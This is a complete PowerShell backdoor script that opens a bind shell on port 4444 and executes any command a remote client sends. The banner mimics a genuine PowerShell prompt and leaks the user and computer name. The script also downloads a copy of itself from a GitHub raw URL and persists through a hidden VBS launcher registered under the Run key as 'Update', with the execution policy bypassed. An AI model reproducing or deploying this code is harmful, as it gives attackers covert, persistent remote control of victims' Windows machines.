function mybindps 
{ 
    
	Param ( 
        [int]
        $Port
    )
	
    try 
    {
	
		$code = {
				param(
				[System.Net.Sockets.TcpClient]$client
				)
		
						$stream = $client.GetStream()
						[byte[]]$bytes = 0..65535|%{0}

						#Send back current username and computername
						$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
						$stream.Write($sendbytes,0,$sendbytes.Length)

						#Show an interactive PowerShell prompt
						$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
						$stream.Write($sendbytes,0,$sendbytes.Length)

						while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne -1)
						{
							$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
							$data = $EncodedText.GetString($bytes,0, $i)
							
							try
							{
								#Execute the command on the target.
								$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
							}
							catch
							{
								Write-Warning "Something went wrong with execution of command on the target." 
								Write-Error $_
							}
							$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
							$x = ($error[0] | Out-String)
							$error.clear()
							$sendback2 = $sendback2 + $x

							#Return the results
							$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
							$stream.Write($sendbyte,0,$sendbyte.Length)
							$stream.Flush()  
						}
						$client.Close()
						if ($listener)
						{
							$listener.Stop()
						}
		}#code
	
	
	#enable auto  run 
				 $name = "persist.vbs"         
				#Out-File -InputObject $all -Force $env:TEMP\$modulename    
				$modulename = "mybindps.ps1"
				$webclient = New-Object System.Net.WebClient
				$file = "$env:temp\$modulename"
				$webclient.DownloadFile("https://raw.githubusercontent.com/xingkong123600/TT/master/mybindps.ps1","$file")
			
				New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
				echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
				echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
       
	 #enable auto run 
	   
            $listener = [System.Net.Sockets.TcpListener]$Port
			#$listener = New-Object System.Net.Sockets.TcpListener($Port)
            $listener.start()    
			while(1){
				 $client = $listener.AcceptTcpClient()
				 
				$newRunspace = [RunSpaceFactory]::CreateRunspace()
				$newRunspace.ApartmentState = 'MTA'
				$newRunspace.Open()
				$newPowerShell = [PowerShell]::Create()
				$newPowerShell.Runspace = $newRunspace
				[void]$newPowerShell.AddScript($code).AddArgument($client)
				$newPowerShell.Invoke()
				$newPowerShell.Runspace.Close()
				$newPowerShell.Dispose()
			}
    }
    catch
    {	
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
		
		
    }
}
mybindps(4444)










